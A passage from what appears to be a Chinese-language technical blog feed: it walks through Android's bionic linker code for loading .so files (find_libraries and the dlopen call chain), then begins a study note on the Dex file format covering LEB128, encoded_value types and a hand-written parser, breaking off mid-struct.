local_group_roots.push_back(soinfos[0]);  &#125;  for (auto&amp;&amp; task : load_tasks) &#123;    soinfo* si = task-&gt;get_soinfo();    soinfo* needed_by = task-&gt;get_needed_by();    bool is_dt_needed = needed_by != nullptr &amp;&amp; (needed_by != start_with || add_as_children);    android_namespace_t* needed_by_ns =        is_dt_needed ? needed_by-&gt;get_primary_namespace() : ns;    if (!si-&gt;is_linked() &amp;&amp; si-&gt;get_primary_namespace() != needed_by_ns) &#123;      auto it = std::find(local_group_roots.begin(), local_group_roots.end(), si);      LD_LOG(kLogDlopen,             &quot;Crossing namespace boundary (si=%s@%p, si_ns=%s@%p, needed_by=%s@%p, ns=%s@%p, needed_by_ns=%s@%p) adding to local_group_roots: %s&quot;,             si-&gt;get_realpath(),             si,             si-&gt;get_primary_namespace()-&gt;get_name(),             si-&gt;get_primary_namespace(),             needed_by == nullptr ? &quot;(nullptr)&quot; : needed_by-&gt;get_realpath(),             needed_by,             ns-&gt;get_name(),             ns,             needed_by_ns-&gt;get_name(),             needed_by_ns,             it == local_group_roots.end() ? &quot;yes&quot; : &quot;no&quot;);      if (it == local_group_roots.end()) &#123;        local_group_roots.push_back(si);      &#125;    &#125;  &#125;  // Step 6: Link all local groups  for (auto root : local_group_roots) &#123;    soinfo_list_t local_group;    android_namespace_t* local_group_ns = root-&gt;get_primary_namespace();    walk_dependencies_tree(root,      [&amp;] (soinfo* si) &#123;        if (local_group_ns-&gt;is_accessible(si)) &#123;          local_group.push_back(si);          return kWalkContinue;        &#125; else &#123;          return kWalkSkip;        &#125;      &#125;);    soinfo_list_t global_group = local_group_ns-&gt;get_global_group();    SymbolLookupList lookup_list(global_group, local_group);    soinfo* local_group_root = local_group.front();    bool linked = local_group.visit([&amp;](soinfo* si) &#123;      // Even though local group may contain accessible soinfos from other namespaces      // we should avoid linking them (because if they are not linked -&gt; they      // are in the local_group_roots and will be linked later).      if (!si-&gt;is_linked() &amp;&amp; si-&gt;get_primary_namespace() == local_group_ns) &#123;        const android_dlextinfo* link_extinfo = nullptr;        if (si == soinfos[0] || reserved_address_recursive) &#123;          // Only forward extinfo for the first library unless the recursive          // flag is set.          link_extinfo = extinfo;        &#125;        if (__libc_shared_globals()-&gt;load_hook) &#123;          __libc_shared_globals()-&gt;load_hook(si-&gt;load_bias, si-&gt;phdr, si-&gt;phnum);        &#125;        lookup_list.set_dt_symbolic_lib(si-&gt;has_DT_SYMBOLIC ? si : nullptr);        if (!si-&gt;link_image(lookup_list, local_group_root, link_extinfo, &amp;relro_fd_offset) ||            !get_cfi_shadow()-&gt;AfterLoad(si, solist_get_head())) &#123;          return false;        &#125;      &#125;      return true;    &#125;);    if (!linked) &#123;      return false;    &#125;  &#125;  // Step 7: Mark all load_tasks as linked and increment refcounts  // for references between load_groups (at this point it does not matter if  // referenced load_groups were loaded by previous dlopen or as part of this  // one on step 6)  if (start_with != nullptr &amp;&amp; add_as_children) &#123;    start_with-&gt;set_linked();  &#125;  for (auto&amp;&amp; task : load_tasks) &#123;    soinfo* si = task-&gt;get_soinfo();    si-&gt;set_linked();  &#125;  for (auto&amp;&amp; task : load_tasks) &#123;    soinfo* si = task-&gt;get_soinfo();    soinfo* needed_by = task-&gt;get_needed_by();    if (needed_by != nullptr &amp;&amp;        needed_by != start_with &amp;&amp;        needed_by-&gt;get_local_group_root() != si-&gt;get_local_group_root()) &#123;      si-&gt;increment_ref_count();    &#125;  &#125;  return true;&#125;static soinfo* find_library(android_namespace_t* ns,                            const char* name, int rtld_flags,                            const android_dlextinfo* extinfo,                            soinfo* needed_by) &#123;  soinfo* si = nullptr;  if (name == nullptr) &#123;    si = solist_get_somain();  &#125; else if (!find_libraries(ns,                             needed_by,                             &amp;name,                             1,                             &amp;si,                             nullptr,                             0,                             rtld_flags,                             extinfo,                             false /* add_as_children */)) &#123;    if (si != nullptr) &#123;      soinfo_unload(si);    &#125;    return nullptr;  &#125;  si-&gt;increment_ref_count();  return si;&#125;</code></pre><p>​这部分代码很长，在安卓源码中也有对齐进行了批注，一步一步地去加载和解析 so 文件，去实现 so 文件的加载。<br>​</p><p><strong>Step 0</strong>：准备 load_tasks 和 soinfos</p><ul><li>每个库对应一个 LoadTask，保存库名、namespace、依赖信息；</li><li>如果 soinfos 为 null，临时在栈上分配并构造，用于回滚失败（即如果某个库加载失败，要卸载前面已经加载的库）。</li></ul><pre><code class="language-c++">for (size_t i = 0; i &lt; library_names_count; ++i) &#123;    load_tasks.push_back(LoadTask::create(name, start_with, ns, &amp;readers_map));&#125;</code></pre><p><strong>Step 1</strong>：扩展 DT_NEEDED 依赖</p><ul><li>对每个 <strong>LoadTask</strong>，查找它的依赖库（DT_NEEDED）；</li><li><strong>注意</strong>：先不真正加载 DT_NEEDED 的库，只是把它们加入 load_tasks 队列；</li><li>is_dt_need 表示当前库是依赖库还是主库，主库可以使用 <strong>extinfo</strong>（比如保留地址）；</li><li>如果 find_library_internal 失败，直接返回 false；</li><li>LD_PRELOAD 的库必须加入全局组（DF_1_GLOBAL)；</li><li>可选地把库添加到其他 namespace，实现跨 namespace 可见。</li></ul><pre><code class="language-c++">for (size_t i = 0; i&lt;load_tasks.size(); ++i) &#123;    LoadTask* task = load_tasks[i];    bool is_dt_needed = needed_by != nullptr &amp;&amp; (needed_by != start_with || add_as_children);    task-&gt;set_extinfo(is_dt_needed ? nullptr : extinfo);    task-&gt;set_dt_needed(is_dt_needed);    if (!find_library_internal(start_ns, task, &amp;zip_archive_cache, &amp;load_tasks, rtld_flags)) &#123;      return false;    &#125;&#125;</code></pre><pre><code class="language-c++">if (ld_preloads != nullptr &amp;&amp; soinfos_count &lt; ld_preloads_count) &#123;    ld_preloads-&gt;push_back(si);&#125;if (is_ld_preload || (si-&gt;get_dt_flags_1() &amp; DF_1_GLOBAL) != 0) &#123;    for (auto linked_ns : *namespaces) &#123;        linked_ns-&gt;add_soinfo(si);        si-&gt;add_secondary_namespace(linked_ns);    &#125;&#125;</code></pre><p><strong>Step 2</strong>：加载库的顺序处理</p><ul><li>将待加载库整理到 load_list；</li><li><strong>随机顺序加载</strong>：为了避免库依赖顺序错误；</li><li>如果使用保留地址（ANDROID_DLEXT_RESERVED_ADDRESS_RECURSIVE），则不打乱顺序。</li></ul><pre><code class="language-c++">LoadTaskList load_list;for (auto&amp;&amp; task : load_tasks) &#123; ... &#125;shuffle(&amp;load_list);</code></pre><p><strong>Step 3</strong>：预链接 DT_NEEDED 库</p><ul><li>预解析动态节（.dynamic），计算符号表、依赖关系；</li><li>支持 RELRO（只读重定位段）共享，提升 WebView 等库安全性；</li><li>对 ELF 文件结构进行检查，只有对应的 so 文件时完整的才能进行加载链接；</li><li>将 soinfo 注册到 TLS 段。</li></ul><pre><code class="language-c++">bool any_memtag_stack = false;for (auto&amp;&amp; task : load_tasks) &#123;  soinfo* si = task-&gt;get_soinfo();  if (!si-&gt;is_linked() &amp;&amp; !si-&gt;prelink_image(dlext_use_relro)) &#123;    return false;  &#125;  // si-&gt;memtag_stack() needs to be called after si-&gt;prelink_image() which populates  // the dynamic section.  if (si-&gt;memtag_stack()) &#123;    any_memtag_stack = true;    LD_LOG(kLogDlopen,           &quot;... load_library requesting stack MTE for: realpath=\&quot;%s\&quot;, soname=\&quot;%s\&quot;&quot;,           si-&gt;get_realpath(), si-&gt;get_soname());  &#125;  register_soinfo_tls(si);&#125;</code></pre><p><strong>Step 4</strong>：处理全局符号解析</p><ul><li>设置 LD_PRELOAD 库为全局，该库必须全局可见，以便后续库解析符号。</li></ul><pre><code class="language-c++">if (ld_preloads != nullptr) &#123;    for (auto&amp;&amp; si : *ld_preloads) &#123;        si-&gt;set_dt_flags_1(si-&gt;get_dt_flags_1() | DF_1_GLOBAL);    &#125;&#125;</code></pre><p><strong>Step 5 — 7</strong>：这几步就很细节了，确定哪些库是 local_group 的根节点，用于处理跨 namespace 的依赖，保证跨 namespace 的库在独立的 local_group 内被链接，不干扰其他 namespace；遍历每个 local_group root 的依赖树，对每个库 调用 link_image，执行 ELF load &#x2F; mmap、Relocation、符号解析、RELRO &#x2F; memtag 支持，即保证依赖库按正确顺序链接，支持 namespace 隔离和安全特性；管理生命周期，保证库在依赖的期间不会被卸载。</p><p>​至此，整个 so 文件被全部解析处理。</p><h3 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h3><p>​重新梳理一下整个 so 文件加载过程，我们首先通过 <strong>System.load()</strong> 进入，此方法最终调用 Runtime.loadLibrary0()，然后进入 nativeLoad() 函数，nativeLoad –&gt; JVM_NativeLoad，接着进入 JavaVMExt::LoadNativeLibrary 方法后，最终会调用 dlopen 进行真正的 so 文件加载（在 Android 12 及以上版本，会调用 <code>android_dlopen_ext</code> 返回 <code>__loader_android_dlopen_ext</code>），该方法最终调用 dlopen_ext()；再就是 do_dlopen()，在该函数中，会调用 <code>find_library()</code> 进行 SO 文件的真正加载。</p><p>​这里是对于soinfo的赋值，同时在这里开始调用so的.init_proc函数，接着调用.init_array中的函数，最后才是JNI_OnLoad函数。最后到达<strong>find_libraries</strong> 执行最后的处理。</p><p>附上文章中的流程图<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250909175709885.png" alt="image-20250909175709885"></p>]]></content>
      
      
      <categories>
          
          <category> Android学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dex 文件结构学习</title>
      <link href="/2025/08/25/Dex%20%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/08/25/Dex%20%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Dex-文件结构学习"><a href="#Dex-文件结构学习" class="headerlink" title="Dex 文件结构学习"></a>Dex 文件结构学习</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>​        为了更好的学习 Android 加固，所以还是打算好好学一下 Dex 文件结构，于是在 看雪 上找到了一篇蛮详细的<a href="https://bbs.kanxue.com/thread-284995.htm">文章</a>进行学习。</p><h3 id="二、开始"><a href="#二、开始" class="headerlink" title="二、开始"></a>二、开始</h3><h4 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h4><p>自行编译 dex 文件供后续分析</p><pre><code class="language-Java">public class Main &#123;    public static void main(String[] args) &#123;        System.out.printf(&quot;Hello and welcome!\n&quot;);        for (int i = 1; i &lt;= 5; i++) &#123;            System.out.println(&quot;i = &quot; + i);        &#125;    &#125;&#125;</code></pre><p>编译指令</p><pre><code class="language-shell">javac Main.javad8 --output=dex_out/ Main.class</code></pre><p>即可得到一个 dex 文件。</p><hr><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>Android 源码 <a href="https://bbs.kanxue.com/elink@56bK9s2c8@1M7q4">http://androidxref.com/2.3.7/xref/dalvik/libdex/DexFile.h</a> （但是现在访问不了了），定义了 dex 文件用到的数据结构</p><table><thead><tr><th align="left">自定义类型</th><th align="left">原类型</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">s1</td><td align="left">int8_t</td><td align="left">有符号单字节</td></tr><tr><td align="left">u1</td><td align="left">uint8_t</td><td align="left">无符号单字节</td></tr><tr><td align="left">s2</td><td align="left">int16_t</td><td align="left"></td></tr><tr><td align="left">u2</td><td align="left">uint16_t</td><td align="left"></td></tr><tr><td align="left">s4</td><td align="left">int32_t</td><td align="left"></td></tr><tr><td align="left">u4</td><td align="left">uint32_t</td><td align="left"></td></tr><tr><td align="left">s8</td><td align="left">int64_t</td><td align="left"></td></tr><tr><td align="left">u8</td><td align="left">uint64_t</td><td align="left"></td></tr><tr><td align="left">sleb128</td><td align="left">无</td><td align="left">有符号LEB128,可变长度</td></tr><tr><td align="left">uleb128</td><td align="left">无</td><td align="left">无符号LEB128,可变长度</td></tr><tr><td align="left">uleb128p1</td><td align="left">无</td><td align="left">等于ULEB128加1,可变长度</td></tr></tbody></table><h5 id="Leb-128"><a href="#Leb-128" class="headerlink" title="Leb 128"></a>Leb 128</h5><p>​        sleb 128、uleb 128、uleb 128p1 是 dex 文件中特有的 <strong>LEB 128</strong> 类型，在下述 Android 源码位置可以找到 LEB 128 的实现。<a href="https://bbs.kanxue.com/elink@4a4K9s2c8@1M7q4">http://androidxref.com/2.3.7/xref/dalvik/libdex/Leb128.h</a>。</p><p>​        每个 <strong>LEB 128</strong> 由 1- 5 字节组成，所有字节组合在一起标识一个 <strong>32 位</strong> 的数据，每个字节只有<strong>低 7 位</strong>为有效位，最高位需要用来标识是否需要使用额外字节。</p><p>​        如果第一个字节的最高位为 1，表示 LEB 128 需要使用第二个字节，如果第二个字节的最高位为 1，表示会使用第三个字节，依次类推，直到最后一个字节的最高位为 0。</p><ul><li>下面举个例子</li></ul><blockquote><ol><li>300(10) &#x3D; 100101100(2)。然后按 7 位一组，从低位开始切分</li><li>100101100<br>&#x3D; [0010110]  [0010]</li><li>组装字节<ul><li>第一个字节，由于后面还有字节-&gt;最高位设为 1，得到，10101100 &#x3D; 0xAC</li><li>第二个字节，没有后续 -&gt; 故最高位设为 0，得到，00000010 &#x3D; 0x02</li></ul></li><li>最终编码<br>300 -&gt; [0xAC, 0x02]</li></ol></blockquote><p>​        uleb 128 读取代码如下。值得注意的是参数为二级指针，也就是说，调用该函数时移动一级指针，一级指针的偏移量所指即为读取到的 uleb 128 的大小。</p><pre><code class="language-c++">int readUnsignedLeb128(const u1** pStream) &#123;    const u1* ptr = *pStream;    int result = *(ptr++);     if (result &gt; 0x7f) &#123;        int cur = *(ptr++);        result = (result &amp; 0x7f) | ((cur &amp; 0x7f) &lt;&lt; 7);        if (cur &gt; 0x7f) &#123;            cur = *(ptr++);            result |= (cur &amp; 0x7f) &lt;&lt; 14;            if (cur &gt; 0x7f) &#123;                cur = *(ptr++);                result |= (cur &amp; 0x7f) &lt;&lt; 21;                if (cur &gt; 0x7f) &#123;                    /*                     * Note: We don&#39;t check to see if cur is out of                     * range here, meaning we tolerate garbage in the                     * high four-order bits.                     */                    cur = *(ptr++);                    result |= cur &lt;&lt; 28;                &#125;            &#125;        &#125;    &#125;     *pStream = ptr;    return result;&#125;</code></pre><p>​        为方便使用自定义的 <strong>myReadUnsignedLeb128 函数</strong>，参数为一级指针，返回读取的数据及其大小。</p><pre><code class="language-c++">// 传入指针直接读取数据并返回数据和读取的大小(可选)int myReadUnsignedLeb128(const u1* pData,size_t* readSize) &#123;    const u1** pStream = &amp;pData;    u4 result=readUnsignedLeb128(pStream);    if(readSize)        *readSize=unsignedLeb128Size(result);    return result;&#125;</code></pre><h5 id="encoded-value"><a href="#encoded-value" class="headerlink" title="encoded_value"></a>encoded_value</h5><p>​        参考 Android 官方文档 <a href="https://bbs.kanxue.com/elink@e2eK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6L8%4g2J5j5$3g2Q4x3X3g2S2L8X3c8J5L8$3W2V1i4K6u0W2j5$3!0E0i4K6u0r3k6r3!0U0M7#2">https://source.android.com/docs/core/dalvik/dex-format?hl=zh-cn#encoding</a> 。</p><p>​        解析 <strong>DexClassDef 结构</strong> 时，Annotation 的 annotation_element 和 encoded_array_item 会使用该编码。</p><p>​        编码格式如下，1 字节的头用于指定 value 格式和大小，后续紧跟数据，需要根据类型解析。</p><table><thead><tr><th align="left">名称</th><th align="left">格式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">(value_arg &lt;&lt; 5) | value_type</td><td align="left">ubyte</td><td align="left">高3位为value_arg的值，低5位为value_type的值，value_type指定value的格式。</td></tr><tr><td align="left">value</td><td align="left">ubyte[]</td><td align="left">用于表示值的字节，不同 value_type 字节的长度不同且采用不同的解译方式；不过一律采用小端字节序。</td></tr></tbody></table><p>value_type 枚举定义如下：</p><table><thead><tr><th align="left">类型名称</th><th align="left">value_type</th><th align="left">value_arg</th><th align="left">value格式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">VALUE_BYTE</td><td align="left">0x00</td><td align="left">（无；必须为 <code>0</code>）</td><td align="left">ubyte[1]</td><td align="left">有符号的单字节整数值</td></tr><tr><td align="left">VALUE_SHORT</td><td align="left">0x02</td><td align="left">size - 1 (0…1)</td><td align="left">ubyte[size]</td><td align="left">有符号的双字节整数值，符号扩展</td></tr><tr><td align="left">VALUE_CHAR</td><td align="left">0x03</td><td align="left">size - 1 (0…1)</td><td align="left">ubyte[size]</td><td align="left">无符号的双字节整数值，零扩展</td></tr><tr><td align="left">VALUE_INT</td><td align="left">0x04</td><td align="left">size - 1 (0…3)</td><td align="left">ubyte[size]</td><td align="left">有符号的四字节整数值，符号扩展</td></tr><tr><td align="left">VALUE_LONG</td><td align="left">0x06</td><td align="left">size - 1 (0…7)</td><td align="left">ubyte[size]</td><td align="left">有符号的八字节整数值，符号扩展</td></tr><tr><td align="left">VALUE_FLOAT</td><td align="left">0x10</td><td align="left">size - 1 (0…3)</td><td align="left">ubyte[size]</td><td align="left">四字节位模式，向右零扩展，系统会将其解译为 IEEE754 32 位浮点值</td></tr><tr><td align="left">VALUE_DOUBLE</td><td align="left">0x11</td><td align="left">size - 1 (0…7)</td><td align="left">ubyte[size]</td><td align="left">八字节位模式，向右零扩展，系统会将其解译为 IEEE754 64 位浮点值</td></tr><tr><td align="left">VALUE_METHOD_TYPE</td><td align="left">0x15</td><td align="left">size - 1 (0…3)</td><td align="left">ubyte[size]</td><td align="left">无符号（零扩展）四字节整数值，会被解译为要编入 <code>proto_ids</code> 区段的索引；表示方法类型值</td></tr><tr><td align="left">VALUE_METHOD_HANDLE</td><td align="left">0x16</td><td align="left">size - 1 (0…3)</td><td align="left">ubyte[size]</td><td align="left">无符号（零扩展）四字节整数值，会被解译为要编入 <code>method_handles</code> 区段的索引；表示方法句柄值</td></tr><tr><td align="left">VALUE_STRING</td><td align="left">0x17</td><td align="left">size - 1 (0…3)</td><td align="left">ubyte[size]</td><td align="left">无符号（零扩展）四字节整数值，会被解译为要编入 <code>string_ids</code> 区段的索引；表示字符串值</td></tr><tr><td align="left">VALUE_TYPE</td><td align="left">0x18</td><td align="left">size - 1 (0…3)</td><td align="left">ubyte[size]</td><td align="left">无符号（零扩展）四字节整数值，会被解译为要编入 <code>type_ids</code> 区段的索引；表示反射类型&#x2F;类值</td></tr><tr><td align="left">VALUE_FIELD</td><td align="left">0x19</td><td align="left">size - 1 (0…3)</td><td align="left">ubyte[size]</td><td align="left">无符号（零扩展）四字节整数值，会被解译为要编入 <code>field_ids</code> 区段的索引；表示反射字段值</td></tr><tr><td align="left">VALUE_METHOD</td><td align="left">0x1a</td><td align="left">size - 1 (0…3)</td><td align="left">ubyte[size]</td><td align="left">无符号（零扩展）四字节整数值，会被解译为要编入 <code>method_ids</code> 区段的索引；表示反射方法值</td></tr><tr><td align="left">VALUE_ENUM</td><td align="left">0x1b</td><td align="left">size - 1 (0…3)</td><td align="left">ubyte[size]</td><td align="left">无符号（零扩展）四字节整数值，会被解译为要编入 <code>field_ids</code> 区段的索引；表示枚举类型常量的值</td></tr><tr><td align="left">VALUE_ARRAY</td><td align="left">0x1c</td><td align="left">（无；必须为 <code>0</code>）</td><td align="left">encoded_array</td><td align="left">值的数组，采用下文“<code>encoded_array</code> 格式”所指定的格式。<code>value</code> 的大小隐含在编码中。</td></tr><tr><td align="left">VALUE_ANNOTATION</td><td align="left">0x1d</td><td align="left">（无；必须为 <code>0</code>）</td><td align="left">encoded_annotation</td><td align="left">子注解，采用下文“<code>encoded_annotation</code> 格式”所指定的格式。<code>value</code> 的大小隐含在编码中。</td></tr><tr><td align="left">VALUE_NULL</td><td align="left">0x1e</td><td align="left">（无；必须为 <code>0</code>）</td><td align="left">（无）</td><td align="left"><code>null</code> 引用值</td></tr><tr><td align="left">VALUE_BOOLEAN</td><td align="left">0x1f</td><td align="left">布尔值 (0…1)</td><td align="left">（无）</td><td align="left">一位值；<code>0</code> 表示 <code>false</code>，<code>1</code> 表示 <code>true</code>。该位在 <code>value_arg</code> 中表示。</td></tr></tbody></table><p>​        解析代码如下（<strong>该函数在解析DexClassDef的Annotation时才会使用,可先忽略</strong>）。</p><p>​        <strong>parseEncodedValue 函数</strong> 会自动读取单个 encoded_value 并返回解析后的字符串（类型：值 的 键值对 形式）以及 value 占用的真实字节数。</p><pre><code class="language-c++">// 读取EncodedValue, 由于大小不固定, 故直接以数组赋值形式取值void DexFile::getEncodedValue(ubyte* pDest,const ubyte* pValue,int size) &#123;    for(int i=0;i&lt;size;i++) &#123;        pDest[i]=pValue[i];    &#125;&#125;// 解析EncodedValue, 返回解析后的字符串以及value真实大小 Todo: 完善解析逻辑,剩余3个分支std::string DexFile::parseEncodedValue(ubyte* pEncodedValue,size_t&amp; valueRealSize) &#123;    ubyte valueArg = GetValueArg(pEncodedValue[0]);// arg=size-1,值占用的字节数&lt;=对应类型大小,不含头部的单字节    ubyte valueType = GetValueType(pEncodedValue[0]);    // 假如int=0时,占2字节,头1字节,值0占1字节,所以要同时判断arg和type    if(valueArg==0) &#123;        //arg==0时,要确定是arg固定为0的特殊类型还是其他类型        //特殊类型只有1字节头,其他类型是1字节头+1字节数据        bool isSpecialType=false;        switch (valueType) &#123;            case VALUE_BYTE:            case VALUE_ARRAY:            case VALUE_ANNOTATION:            case VALUE_NULL:            case VALUE_BOOLEAN:            isSpecialType=true;            break;        &#125;        if(isSpecialType)            valueRealSize=1;        else            valueRealSize=2;    &#125;    else        valueRealSize=valueArg+2;// 头部1字节+实际大小 size=head+arg+1    int readValueSize=valueArg+1;// 需要读取的字节数    ubyte* pValue=&amp;pEncodedValue[1];    std::string result;    unsigned int index=0;    switch(valueType) &#123;        // 有符号单字节        case VALUE_BYTE: &#123;            char byte=0;            getEncodedValue((ubyte*)&amp;byte,pValue,readValueSize);            result=&quot;byte:&quot;+std::format(&quot;0x&#123;:x&#125;&quot;,byte);            break;        &#125;        // 有符号双字节        case VALUE_SHORT: &#123;            short value_short=0;            getEncodedValue((ubyte*)&amp;value_short,pValue,readValueSize);            result=&quot;short:&quot;+std::format(&quot;0x&#123;:x&#125;&quot;,value_short);            break;        &#125;        // 无符号双字节        case VALUE_CHAR: &#123;            unsigned short value_char=0;            getEncodedValue((ubyte*)&amp;value_char,pValue,readValueSize);            result=&quot;char:&quot;+std::format(&quot;0x&#123;:x&#125;&quot;,value_char);            break;        &#125;        // 有符号4字节        case VALUE_INT: &#123;            int value_int=0;            getEncodedValue((ubyte*)&amp;value_int,pValue,readValueSize);            result=&quot;int:&quot;+std::format(&quot;0x&#123;:x&#125;&quot;,value_int);            break;        &#125;        // 有符号8字节        case VALUE_LONG: &#123;            long long value_long=0;            getEncodedValue((ubyte*)&amp;value_long,pValue,readValueSize);            result=&quot;long:&quot;+std::format(&quot;0x&#123;:x&#125;&quot;,value_long);            break;        &#125;        // 4字节浮点        case VALUE_FLOAT: &#123;            float value_float=0;            getEncodedValue((ubyte*)&amp;value_float,pValue,readValueSize);            result=&quot;float:&quot;+std::format(&quot;&#123;:f&#125;&quot;,value_float);            break;        &#125;        // 8字节浮点        case VALUE_DOUBLE: &#123;            double value_double=0;            getEncodedValue((ubyte*)&amp;value_double,pValue,readValueSize);            result=&quot;double:&quot;+std::format(&quot;&#123;:f&#125;&quot;,value_double);            break;        &#125;        // 无符号4字节索引 指向对应结构        case VALUE_METHOD_TYPE: &#123;            // ProtoId            getEncodedValue((ubyte*)&amp;index,pValue,readValueSize);            result=&quot;MethodType:&quot;+std::format(&quot;0x&#123;:x&#125;&quot;,index)+&quot; &quot;+getProtoIdDataByIndex(index);            break;        &#125;        // todo: 这部分没有定义的成员指向,暂时不知如何解析,参考 https://source.android.com/docs/core/runtime/dex-format?hl=zh-cn#method-handle-item        case VALUE_METHOD_HANDLE: &#123;            // MethodHandles            getEncodedValue((ubyte*)&amp;index,pValue,readValueSize);            result=&quot;MethodHandle Index:&quot;+std::format(&quot;0x&#123;:x&#125;&quot;,index);            break;        &#125;        case VALUE_STRING: &#123;                    // StringId            getEncodedValue((ubyte*)&amp;index,pValue,readValueSize);            result=&quot;String:&quot;+getStringIdDataByIndex(index);            break;        &#125;        case VALUE_TYPE: &#123;            // TypeId            getEncodedValue((ubyte*)&amp;index,pValue,readValueSize);            result=&quot;Type:&quot;+parseString(getTypeIdDataByIndex(index));            break;        &#125;        case VALUE_FIELD: &#123;            // FieldId            getEncodedValue((ubyte*)&amp;index,pValue,readValueSize);            result=&quot;Field:&quot;+parseString(getFieldIdDataByIndex(index));            break;        &#125;        case VALUE_METHOD: &#123;            // MethodId            getEncodedValue((ubyte*)&amp;index,pValue,readValueSize);            result=&quot;Method:&quot;+parseString(getMethodIdDataByIndex(index));            break;        &#125;        case VALUE_ENUM: &#123;            // FieldId            getEncodedValue((ubyte*)&amp;index,pValue,readValueSize);            result=&quot;Enum:&quot;+parseString(getFieldIdDataByIndex(index));            break;        &#125;        // todo encoded_array和encoded_annotation结构,不太容易解析        case VALUE_ARRAY: &#123;            //getEncodedValue((ubyte*)&amp;index,pValue,readValueSize);            // DexEncodedArray encodedArray;//直接解析貌似不正确            // getEncodedValue((ubyte*)&amp;encodedArray,pValue,readValueSize);            // printClassDefStaticValues(encodedArray);            // int sizeLen=0;            // u4 size=myReadUnsignedLeb128(pValue,&amp;sizeLen);            // u1* pValues=pValue+sizeLen;            // printf(&quot;EncodedArray contains %d values\n&quot;,size);            // unsigned int offset=0;// offset保存前方已访问的结构大小            // for(int i=0;i&lt;size;i++) &#123;            //     printf(&quot;%s\n&quot;,parseEncodedValue(pValues+offset,offset).c_str());            // &#125;            //system(&quot;pause&quot;);            break;        &#125;        case VALUE_ANNOTATION:        result=&quot;Todo......&quot;;        break;        case VALUE_NULL:            result=&quot;null&quot;;        break;        // boolean的值存在value_arg中        case VALUE_BOOLEAN:            result=&quot;bool:&quot;;            if(valueArg)                result+=&quot;true&quot;;            else                result+=&quot;false&quot;;            break;        default:            result=&quot;Unknown value type&quot;;    &#125;    return result;&#125;</code></pre><h5 id="encoded-array"><a href="#encoded-array" class="headerlink" title="encoded_array"></a>encoded_array</h5><table><thead><tr><th align="left">名称</th><th align="left">格式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">size</td><td align="left">uleb128</td><td align="left">数组中的元素数量</td></tr><tr><td align="left">values</td><td align="left">encoded_value[size]</td><td align="left">采用本部分所指定格式的一系列 <code>size</code> <code>encoded_value</code> 字节序列；依序串联。</td></tr></tbody></table><p>​        由于 <strong>encoded_array.values 数组元素</strong>为encoded_value，所以每个元素的大小不固定，不能当作一般的数组解析。</p><h5 id="encoded-annotation"><a href="#encoded-annotation" class="headerlink" title="encoded_annotation"></a>encoded_annotation</h5><p>​        该类型主要在 DexClassDef 的 Annotations 部分使用，此处仅做介绍。</p><table><thead><tr><th align="left">名称</th><th align="left">格式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">type_idx</td><td align="left">uleb128</td><td align="left">注释的类型。这种类型必须是“类”（而非“数组”或“基元”）。</td></tr><tr><td align="left">size</td><td align="left">uleb128</td><td align="left">此注解中 name-value 映射的数量</td></tr><tr><td align="left">elements</td><td align="left">annotation_element[size]</td><td align="left">注解的元素，直接以内嵌形式（不作为偏移量）表示。元素必须按 <code>string_id</code> 索引以升序进行排序。</td></tr></tbody></table><h5 id="annotation-element"><a href="#annotation-element" class="headerlink" title="annotation_element"></a>annotation_element</h5><table><thead><tr><th align="left">名称</th><th align="left">格式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">name_idx</td><td align="left">uleb128</td><td align="left">元素名称，表示为要编入 <code>string_ids</code> 区段的索引。该字符串必须符合上文定义的 MemberName 的语法。</td></tr><tr><td align="left">value</td><td align="left">encoded_value</td><td align="left">元素值</td></tr></tbody></table><p>上述四者之间的关系如下</p><pre><code class="language-typescript">annotation_item  └─ encoded_annotation   // 注解内容       ├─ type_idx        // 注解类型       ├─ size       └─ annotation_element[]            ├─ name (string_idx)            └─ value (encoded_value)                     ├─ 基本类型                     ├─ string/type/field/method/enum                     ├─ encoded_array      // 数组                     └─ encoded_annotation // 注解嵌套</code></pre><hr><h4 id="Dex-整体结构"><a href="#Dex-整体结构" class="headerlink" title="Dex 整体结构"></a>Dex 整体结构</h4><p>​        dex 文件整体结构分为：dex 文件头、索引结构区、data 数据区，示意图如下：</p><ol><li>dex 文件头<ul><li>保存了 dex 文件的基本信息，例如文件大小、dex 头大小、大小端序、索引表的起始地址和大小等；</li></ul></li><li>索引结构区<ul><li>这部分保存了字符串表、类型表、方法原型表、域表、方法表等结构；根据这些表和索引可以访问到对应数据；</li></ul></li><li>data 数据区<ul><li>所有代码和数据存放在该区域。</li></ul></li></ol><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250825160511533.png" alt="image-20250825160511533"></p><p>​        dex 文件结构体的定义在 Android 源码目录 &#x2F;dalvik&#x2F;libdex&#x2F;DexFile.h 中可以找到，其中定义的 dex 文件结构体如下：</p><pre><code class="language-c++">struct DexFile &#123;    /* directly-mapped &quot;opt&quot; header */    const DexOptHeader* pOptHeader;     /* pointers to directly-mapped structs and arrays in base DEX */    const DexHeader*    pHeader;    const DexStringId*  pStringIds;    const DexTypeId*    pTypeIds;    const DexFieldId*   pFieldIds;    const DexMethodId*  pMethodIds;    const DexProtoId*   pProtoIds;    const DexClassDef*  pClassDefs;    const DexLink*      pLinkData;     /*     * These are mapped out of the &quot;auxillary&quot; section, and may not be     * included in the file.     */    const DexClassLookup* pClassLookup;    const void*         pRegisterMapPool;       // RegisterMapClassPool     /* points to start of DEX file data */    const u1*           